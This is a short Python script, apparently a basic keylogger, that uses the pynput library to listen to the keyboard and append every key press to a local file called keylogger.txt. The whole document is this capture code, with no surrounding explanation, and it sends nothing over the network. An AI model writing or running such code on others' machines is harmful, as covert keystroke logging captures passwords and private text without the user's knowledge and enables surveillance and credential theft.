from pynput.keyboard import Key, Listener 
def on_press(key):
    try:
        a=format(key)[4]
        with open('keylogger.txt', 'a+') as f:
            f.write("\n"+format(key)+"\n")
            
    except:
        with open('keylogger.txt', 'a+') as f:
            f.write(format(key)[1])
def on_release(key): 
    while 1:
        break
with Listener(
     on_press=on_press, 
     on_release=on_release) as listener: 
    listener.join() 
